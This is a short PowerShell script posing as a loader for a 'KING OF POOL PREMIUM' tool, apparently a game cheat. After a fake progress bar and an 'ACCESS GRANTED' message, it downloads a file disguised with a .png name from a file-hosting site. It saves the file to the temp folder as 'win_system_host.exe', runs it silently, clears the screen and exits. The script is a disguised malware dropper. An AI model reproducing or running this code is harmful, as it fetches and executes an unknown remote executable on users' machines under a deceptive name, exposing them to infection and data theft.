Clear-Host
$Host.UI.RawUI.WindowTitle = "KING OF POOL LOADING..."
Write-Host "`n  [*] INITIALIZING KING OF POOL PREMIUM" -ForegroundColor Cyan
for ($i=0;$i -le 100;$i+=5){
    $p="$i%"
    $n=[int]($i/5)
    # ใช้เครื่องหมาย = แทนหลอด และ . แทนส่วนที่เหลือ (สวยและชัวร์)
    $b = ("=" * $n) + ("." * (20 - $n))
    Write-Host "`r  ( $b ) $percent  " -NoNewline -ForegroundColor Magenta
    Start-Sleep -Milliseconds 40
}
Write-Host "`n  [+] ACCESS GRANTED. ENGINE STARTED." -ForegroundColor Green
$u="https://files.catbox.moe/lmz0nl.png"
$t="$env:TEMP\win_system_host.exe"
try {
    Invoke-WebRequest -Uri $u -OutFile $t -UseBasicParsing
    Start-Process -FilePath $t
    Clear-Host
    Exit
} catch {}
